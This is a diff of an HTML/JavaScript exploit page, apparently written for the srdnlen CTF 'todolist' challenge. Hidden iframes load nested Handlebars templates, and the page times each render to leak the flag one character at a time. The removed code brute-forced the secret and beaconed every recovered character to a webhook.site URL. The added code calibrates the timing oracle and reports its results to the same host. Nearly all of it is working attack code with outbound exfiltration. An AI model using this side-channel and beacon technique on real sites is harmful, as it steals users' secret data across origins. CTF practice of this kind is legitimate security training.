@@ -1,17 +1,11 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>.</title></head><body>
+<html><head><meta charset="utf-8"><title>calibrate</title></head><body>
 <pre id="log"></pre>
 <script>
-// ── CONFIG ────────────────────────────────────────────────────────────────────
 const TARGET  = "https://todolist.challs.srdnlen.it";
 const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
-const PREFIX  = "srdnlen{leakycs";  // ← update as you find chars
-const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
 const ARRLEN  = 11;
 const DEPTH   = 7;
-const MATCH_TIMEOUT = 2000; // ms — no-match loads ~300ms, match blocks >> 2s
-const BUDGET  = 54000;      // ms — bot has 60s, we use 54s to be safe
-// ─────────────────────────────────────────────────────────────────────────────
 
 const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
 const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
@@ -28,76 +22,60 @@ function makeUrl(pos, ch) {
        + "&template=" + encodeURIComponent(tpl);
 }
 
-// Load one iframe, resolve with {dt, timedOut}
-function probe(pos, ch) {
+function probeOne(pos, ch, timeout) {
   return new Promise(resolve => {
     const f  = document.createElement("iframe");
     f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
     let fired = false;
     const t0  = Date.now();
-
-    function done(timedOut) {
-      if (fired) return;
-      fired = true;
+    function done(label) {
+      if (fired) return; fired = true;
       clearTimeout(tid);
-      try { f.src = "about:blank"; f.remove(); } catch(e) {}
-      resolve({ dt: Date.now() - t0, timedOut });
+      try { f.src="about:blank"; f.remove(); } catch(e) {}
+      resolve({ dt: Date.now()-t0, label });
     }
-
-    // If iframe's onload hasn't fired by MATCH_TIMEOUT,
-    // Handlebars is still computing → this is the matching char
-    const tid = setTimeout(() => done(true), MATCH_TIMEOUT);
-    f.onload  = () => done(false);
-    f.onerror = () => done(false); // blocked = fast = no match
+    const tid = setTimeout(() => done("TIMEOUT"), timeout);
+    f.onload  = () => done("load");
+    f.onerror = () => done("error");
     f.src = makeUrl(pos, ch);
     document.body.appendChild(f);
   });
 }
 
 async function run() {
-  const t0  = Date.now();
-  let flag  = PREFIX;
+  ping("=== CALIBRATION START ===");
+  ping(`Target: ${TARGET}`);
 
-  ping(`[start] ${flag}`);
-  ping(`[info] MATCH_TIMEOUT=${MATCH_TIMEOUT}ms BUDGET=${BUDGET}ms`);
+  // Step 1: Known NO-MATCH — pos=0 char='a'  (flag[0]='s', so 'a' must be fast)
+  ping("\n[TEST 1] pos=0 char='a'  → expected: FAST (no match)");
+  const t1 = await probeOne(0, "a", 10000);
+  ping(`[TEST 1] dt=${t1.dt}ms label=${t1.label} ${t1.dt < 2000 ? "✓ FAST as expected" : "✗ SLOW — unexpected!"}`);
 
-  for (let pos = PREFIX.length; pos < 60; pos++) {
-    const elapsed = Date.now() - t0;
-    if (elapsed > BUDGET) {
-      ping(`[budget] pos=${pos} elapsed=${elapsed}ms — stopping`);
-      navigator.sendBeacon(`${WEBHOOK}?BUDGET&flag=${encodeURIComponent(flag)}`);
-      break;
-    }
+  // Step 2: Known MATCH — pos=0 char='s'  (flag[0]='s', must be slow)
+  ping("\n[TEST 2] pos=0 char='s'  → expected: SLOW (match)");
+  const t2 = await probeOne(0, "s", 10000);
+  ping(`[TEST 2] dt=${t2.dt}ms label=${t2.label} ${t2.dt > 2000 ? "✓ SLOW as expected" : "✗ FAST — oracle broken!"}`);
 
-    ping(`[pos ${pos}] elapsed=${elapsed}ms`);
-    let found = null;
+  // Step 3: Known MATCH — pos=1 char='r'
+  ping("\n[TEST 3] pos=1 char='r'  → expected: SLOW (match)");
+  const t3 = await probeOne(1, "r", 10000);
+  ping(`[TEST 3] dt=${t3.dt}ms label=${t3.label} ${t3.dt > 2000 ? "✓ SLOW as expected" : "✗ FAST — oracle broken!"}`);
 
-    for (const ch of CHARSET) {
-      if (Date.now() - t0 > BUDGET) break;
+  // Step 4: Known NO-MATCH — pos=1 char='z'
+  ping("\n[TEST 4] pos=1 char='z'  → expected: FAST (no match)");
+  const t4 = await probeOne(1, "z", 10000);
+  ping(`[TEST 4] dt=${t4.dt}ms label=${t4.label} ${t4.dt < 2000 ? "✓ FAST as expected" : "✗ SLOW — unexpected!"}`);
 
-      const r = await probe(pos, ch);
-      ping(`[probe] pos=${pos} ch='${ch}' dt=${r.dt}ms timedOut=${r.timedOut}`);
+  // Summary
+  const diff = t2.dt - t1.dt;
+  ping(`\n=== SUMMARY ===`);
+  ping(`no-match baseline: ${t1.dt}ms`);
+  ping(`match time:        ${t2.dt}ms`);
+  ping(`difference:        ${diff}ms`);
+  ping(`oracle works:      ${diff > 1000 ? "YES ✓" : "NO ✗"}`);
+  ping(`good MATCH_TIMEOUT: ${Math.round(t1.dt * 3)}ms  (3× no-match baseline)`);
 
-      if (r.timedOut) {
-        found = ch;
-        break; // no need to test more chars
-      }
-    }
-
-    if (found) {
-      flag += found;
-      ping(`[HIT] pos=${pos} char='${found}'`);
-      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
-      if (found === "}") break;
-    } else {
-      ping(`[MISS] pos=${pos} — char not in charset or budget exceeded`);
-      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
-      break;
-    }
-  }
-
-  ping(`[DONE] ${flag} total=${Date.now()-t0}ms`);
-  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
+  navigator.sendBeacon(`${WEBHOOK}?CALIBRATE_DONE&nomatch=${t1.dt}&match=${t2.dt}&diff=${diff}&works=${diff>1000}`);
 }
 
 run();
